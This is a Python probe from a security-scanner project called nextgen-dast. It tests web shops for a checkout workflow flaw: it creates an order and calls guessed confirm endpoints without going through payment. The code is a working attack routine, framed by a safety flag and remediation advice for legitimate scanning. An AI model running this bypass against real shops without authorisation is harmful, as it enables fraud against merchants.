#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Business logic: workflow / state machine bypass — skipping the
payment step in a multi-step order flow.

A correctly-modeled checkout enforces a state transition: cart →
shipping → payment → confirmation. Each step's controller refuses to
run when the prior step's state isn't recorded against the order.
The classic flaw is that the `confirmation` step trusts the client's
"I already paid" claim instead of consulting the order's payment
record on the server — so an attacker can POST directly to
`/order/confirm` with an order id and skip ahead.

This probe creates an order in the cart state, then jumps directly
to the confirmation/finalize endpoint without first hitting the
payment endpoint. If the server returns a "paid"/"confirmed" status,
we have the bypass.

Detection signal:
  Validated=True only when ALL of:
    1. Confirm/finalize POST returns 200 / 201 with a status
       string in {"paid", "confirmed", "complete"} or returns an
       order_confirmation token, AND
    2. The payment-step endpoint was NEVER hit by this probe (we
       check our own audit log to be sure).

Two corroborating signals required so we don't false-positive on a
cart-side endpoint that returns 200 for everything.
"""
from __future__ import annotations

import json
import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Common multi-step checkout endpoint shapes.
ORDER_CREATE_PATHS = (
    "/api/orders",
    "/api/order",
    "/rest/order",
    "/api/checkout/begin",
)
CONFIRM_PATHS = (
    "/api/orders/{oid}/confirm",
    "/api/order/{oid}/confirm",
    "/api/order/confirm",
    "/api/checkout/finalize",
    "/rest/order/{oid}/finalize",
    "/rest/basket/{oid}/checkout",
)
PAYMENT_PATHS = (
    "/api/payment",
    "/api/orders/{oid}/payment",
    "/api/order/{oid}/payment",
    "/rest/payment",
)
SUCCESS_KEYWORDS = ("paid", "confirmed", "complete", "completed",
                    "success", "fulfilled")


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"skiwf-{secrets.token_hex(6)}@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None,
                 "bid": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            out["bid"] = auth.get("bid") or auth.get("BasketId")
        except json.JSONDecodeError:
            pass
    return out


def _create_order(client: SafeClient, origin: str, token: str,
                  bid: int | None) -> tuple[str, int | None]:
    """POST a new order in the 'cart' state. Returns (path_used, oid)."""
    payload = json.dumps({"BasketId": bid, "items": [],
                          "address": {"line1": "1 Probe St"}}).encode()
    for path in ORDER_CREATE_PATHS:
        r = client.request("POST", urljoin(origin, path), headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=payload)
        if r.status == 404:
            continue
        oid: int | None = None
        try:
            doc = json.loads(r.text or "")
        except json.JSONDecodeError:
            doc = None
        if isinstance(doc, dict):
            for src in (doc, doc.get("data") if isinstance(doc.get("data"), dict) else None):
                if isinstance(src, dict) and isinstance(src.get("id"), int):
                    oid = src["id"]; break
        return path, oid
    return "", None


def _looks_paid(text: str) -> bool:
    """True when the response body advertises a successful checkout
    state. We check both the JSON keys (status/state/paymentStatus)
    and a raw token-presence heuristic for orderConfirmation."""
    try:
        doc = json.loads(text)
    except json.JSONDecodeError:
        doc = None
    if isinstance(doc, dict):
        for src in (doc, doc.get("data") if isinstance(doc.get("data"), dict) else None):
            if not isinstance(src, dict):
                continue
            if src.get("orderConfirmation") or src.get("orderId"):
                return True
            for key in ("status", "state", "paymentStatus", "orderStatus"):
                v = src.get(key)
                if isinstance(v, str) and v.strip().lower() in SUCCESS_KEYWORDS:
                    return True
    # Fallback for non-JSON / unusual shapes.
    return bool(re.search(r'"orderConfirmation"\s*:\s*"[A-Za-z0-9_-]{4,}"',
                          text or ""))


class BizLogicWorkflowSkipPaymentProbe(Probe):
    name = "bizlogic_workflow_skip_payment"
    summary = ("Detects checkout state-machine bypass — order confirm "
               "endpoint accepts a 'paid' transition without the "
               "payment step having been completed.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help=("Required: this probe creates an order row in the "
                  "target's database. Run with --allow-destroy after "
                  "confirming the operator can refund it out-of-band."))

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: this probe creates an order row. "
                         "Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        bid = sess.get("bid")

        order_path, oid = _create_order(client, origin, token, bid)
        if not order_path:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no order-create endpoint on "
                         f"{origin} (all candidates 404)."),
                evidence={"origin": origin,
                          "tried": list(ORDER_CREATE_PATHS)},
            )

        # Try each confirm endpoint; we deliberately do NOT call the
        # payment endpoint first. We track which paths we hit so the
        # final verdict can prove payment was skipped.
        confirm_attempts: list[dict] = []
        for path in CONFIRM_PATHS:
            url_path = path.format(oid=oid) if "{oid}" in path else path
            if "{oid}" in path and oid is None:
                continue
            url = urljoin(origin, url_path)
            r = client.request("POST", url, headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }, body=b"{}")
            entry = {"path": url_path, "status": r.status,
                     "size": r.size,
                     "body_excerpt": (r.text or "")[:160],
                     "looks_paid": _looks_paid(r.text or "")}
            confirm_attempts.append(entry)
            if entry["looks_paid"] and 200 <= r.status < 300:
                break

        # Did we hit a payment endpoint at any point? Audit log
        # records every URL we sent. We treat ANY URL whose path
        # contains "/payment" (case-insensitive) as evidence we
        # didn't actually skip, so the result would be inconclusive.
        payment_urls_hit = [e.url for e in client.audit.entries
                            if "/payment" in (e.url or "").lower()]

        confirmed_attempt = next(
            (a for a in confirm_attempts
             if a["looks_paid"] and 200 <= a["status"] < 300),
            None,
        )
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "order_create_path": order_path, "order_id": oid,
                    "confirm_attempts": confirm_attempts,
                    "payment_urls_hit": payment_urls_hit}

        if confirmed_attempt and not payment_urls_hit:
            return Verdict(
                validated=True, confidence=0.93,
                summary=(f"Confirmed: order confirm endpoint "
                         f"{confirmed_attempt['path']} on {origin} "
                         "marked the order paid/confirmed without the "
                         "payment step ever being invoked."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Server-side state machine MUST verify the order "
                    "is in the `pending_payment_settled` state before "
                    "transitioning to `confirmed`. Two enforceable "
                    "options:\n"
                    "  - Persist a payment_record FK on the order; "
                    "refuse confirm when null.\n"
                    "  - Use a workflow library (Temporal, AASM, "
                    "Statesman) that rejects illegal transitions at "
                    "the model layer."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: confirm endpoints on {origin} either "
                     f"refused the bypass or no 'paid'-shaped success "
                     f"was observed (attempts: {len(confirm_attempts)}, "
                     f"payment_urls_hit: {len(payment_urls_hit)})."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BizLogicWorkflowSkipPaymentProbe().main()
